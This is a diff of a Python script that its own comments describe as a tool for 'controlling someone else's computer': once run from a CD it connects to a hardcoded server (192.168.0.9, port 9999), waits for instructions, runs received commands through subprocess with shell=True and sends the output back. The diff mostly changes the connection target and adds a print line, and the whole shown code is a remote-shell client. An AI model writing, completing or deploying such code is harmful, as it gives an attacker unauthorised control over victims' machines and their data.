@@ -1,6 +1,5 @@
 # Hackers would put on cd and run and connects to server
 
-
 # Once running, connect to server, just wait for instructions
 # Run commands, and send back output to server
 # So controlling someone else's computer
@@ -19,8 +18,10 @@ from os.path import expanduser
 
 def connectToServer():	
 	s = socket.socket()         # Create a socket object
-	host = socket.gethostname() # IP Address of server
-	port = 8080                # Port of server
+	#host = socket.gethostname() # IP Address of server
+	host = '192.168.0.9' #confirmed is this: 192.168.0.12, temp for now: 192.168.0.9
+	port = 9999                # Port of server
+	print "Trying to connect to: {} at {}".format(host, port)
 	s.connect((host, port))
 
 	# Initially, send current working directory to server
@@ -66,6 +67,7 @@ def connectToServer():
 				# Todo: Find better way to get output of script rather than just saying tried
 				# Todo: Cases of & at end or not to run script in background
 				# Todo: Right now scripts can be run with nohup command
+
 				# Pipes any output to standard stream				
 				cmd = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
 				
